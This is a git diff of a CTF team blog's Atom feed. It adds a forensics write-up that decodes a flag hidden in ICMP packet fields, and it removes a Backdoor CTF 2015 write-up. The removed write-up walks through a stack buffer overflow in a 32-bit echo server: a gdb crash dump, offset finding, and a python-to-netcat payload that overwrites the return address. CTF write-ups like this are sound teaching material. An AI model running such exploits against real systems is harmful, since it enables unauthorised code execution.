@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Ctf | GeeksSpeak Team Blog]]></title>
   <link href="http://geeksspeak.github.io/blog/categories/ctf/atom.xml" rel="self"/>
   <link href="http://geeksspeak.github.io/"/>
-  <updated>2015-04-05T03:33:23+04:30</updated>
+  <updated>2015-04-05T15:44:09+04:30</updated>
   <id>http://geeksspeak.github.io/</id>
   <author>
     <name><![CDATA[GeeksSpeak]]></name>
@@ -12,6 +12,32 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[NDH CTF 2015 - Private Writeup]]></title>
+    <link href="http://geeksspeak.github.io/blog/2015/04/05/ndh-ctf-2015-private-writeup/"/>
+    <updated>2015-04-05T15:43:15+04:30</updated>
+    <id>http://geeksspeak.github.io/blog/2015/04/05/ndh-ctf-2015-private-writeup</id>
+    <content type="html"><![CDATA[<p><strong>NDH 2015 Private Writeup</strong>
+<strong>Point = 100</strong>
+<strong>Category = Forensics</strong>
+<strong>Description : </strong></p>
+
+<blockquote><p>&ldquo;The quiet you are, the more you are able to ear&rdquo;</p></blockquote>
+
+<p>We&rsquo;ve provided a pcapng file in this challenge. At first glance I thought it may be VoIP challenge because of description but after viewing packets , this assumption goes wrong. there were some STP , CDP and some ICMP packets . after some investigation in packets i found some unusual ICMP packets ! their identification fields were 0 ! all of them ! hmmm. seems somebody generated them manually by a packet generator . so i focused on them to find a pattern .actually their IP headers had a pattern and they were ASCII numbers ! sweet . that easy . let&rsquo;s have some fun with Scapy .</p>
+
+<pre><code>from scapy.all import *
+from scapy.utils import rdpcap
+flag=""
+pkts=rdpcap("private.pcap")
+for pkt in pkts:
+     if (ICMP in pkt and pkt[ICMP].type==8 and pkt[ICMP].id==0 ):
+        flag += chr(pkt[IP].id)
+print flag      
+</code></pre>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[NDH CTF 2015 - Updator Writeup]]></title>
@@ -510,104 +536,6 @@ function (err, line) {
 </code></pre>
 
 <p>and sha256 of the <code>[redacted]</code> gives us another 150pts.</p>
-
-<p>HAMIDx9</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Backdoor CTF 2015 - ECHO Writeup]]></title>
-    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-echo-writeup/"/>
-    <updated>2015-04-03T02:12:58+04:30</updated>
-    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-echo-writeup</id>
-    <content type="html"><![CDATA[<p><strong>Backdoor 2015 ECHO Writeup</strong><br/>
-<strong>Point = 100</strong><br/>
-<strong>Category = Binary</strong></p>
-
-<blockquote><p>Little Suzie started learning C. She created a simple program that echo&rsquo;s back whatever you input. Here is the binary file. The vampire came across this service on the internet. nc hack.bckdr.in 8002. Reports say he found a flag. See if you can get it.</p></blockquote>
-
-<pre><code>$ file echo
-echo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=15ec07e5664a13e94069c818141cc9f70591d0f0, not stripped
-</code></pre>
-
-<p>As it seems we have a 32bit binary as a ECHO server. the output confirms this:</p>
-
-<pre><code>$ nc hack.bckdr.in 8002
-GeeksSpeak
-ECHO: GeeksSpeak
-</code></pre>
-
-<p>opening the binary in IDA shows us that the main function calls test() as we can see the psuedo-code below :</p>
-
-<!-- more -->
-
-
-<pre><code>int test()
-{
-  char s; // [sp+1Eh] [bp-3Ah]@1
-
-  gets(&amp;s);
-  return fprintf(_bss_start, "ECHO: %s\n", &amp;s);
-}
-</code></pre>
-
-<p>It&rsquo;s an obvious Stack buffer overflow. without loosing time i loaded it into <em>gdb</em> and used  cyclic pattern to find the offset:</p>
-
-<pre><code>$ gdb ./echo -q
-Reading symbols from ./echo...(no debugging symbols found)...done.
-gdb-peda$ pattern_create 100
-'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
-gdb-peda$ shell echo 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL' &gt; echo.test
-gdb-peda$ r &lt; echo.test 
-Starting program: /home/hamidx9/ctf/backdoor/echo &lt; echo.test
-ECHO: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
-
-Program received signal SIGSEGV, Segmentation fault.
-[-----------------------------------------------------------------------------------------------------------registers-----------------------------------------------------------------------------------------------------------]
-EAX: 0x6b (b'k')
-EBX: 0xf7fae000 --&gt; 0x1a8da8 
-ECX: 0x6b (b'k')
-EDX: 0xf7faf86c --&gt; 0x0 
-ESI: 0x0 
-EDI: 0x0 
-EBP: 0x41324141 (b'AA2A')
-ESP: 0xffffcdd0 ("dAA3AAIAAeAA4AA"...)
-EIP: 0x41414841 (b'AHAA')
-[-------------------------------------------------------------------------------------------------------------code--------------------------------------------------------------------------------------------------------------]
-Invalid $PC address: 0x41414841
-[-------------------------------------------------------------------------------------------------------------stack-------------------------------------------------------------------------------------------------------------]
-00:0000| esp 0xffffcdd0 ("dAA3AAIAAeAA4AA"...)
-01:0004|     0xffffcdd4 ("AAIAAeAA4AAJAAf"...)
-02:0008|     0xffffcdd8 ("AeAA4AAJAAfAA5A"...)
-03:0012|     0xffffcddc ("4AAJAAfAA5AAKAA"...)
-04:0016|     0xffffcde0 ("AAfAA5AAKAAgAA6"...)
-05:0020|     0xffffcde4 ("A5AAKAAgAA6AAL")
-06:0024|     0xffffcde8 ("KAAgAA6AAL")
-07:0028|     0xffffcdec ("AA6AAL")
-[-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------]
-Legend: stack, code, data, heap, rodata, value
-Stopped reason: SIGSEGV
-0x41414841 in ?? ()
-gdb-peda$ pattern_offset 'AHAA'
-AHAA found at offset: 62
-gdb-peda$ 
-</code></pre>
-
-<p>So the <code>offset = 62</code>. but where should we jump? IDA shows us there is another function named <code>sample</code> which open <code>flag.txt</code> and print its content. All have to do is to call <code>sample</code> with address = <em>0x0804854d</em>.</p>
-
-<p>Final payload looks like below :</p>
-
-<pre><code>[A*62] + [0x0804854d in little endian]
-</code></pre>
-
-<p>And finally we&rsquo;ve got the flag:</p>
-
-<pre><code>$ python -c 'import struct; q=lambda x: struct.pack("&lt;I", x); print "A"*62+q(0x0804854d)' | nc hack.bckdr.in 8002
-ECHO: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM�
-[redacted]
-</code></pre>
-
-<p>And another 100 pt.</p>
 
 <p>HAMIDx9</p>
 ]]></content>
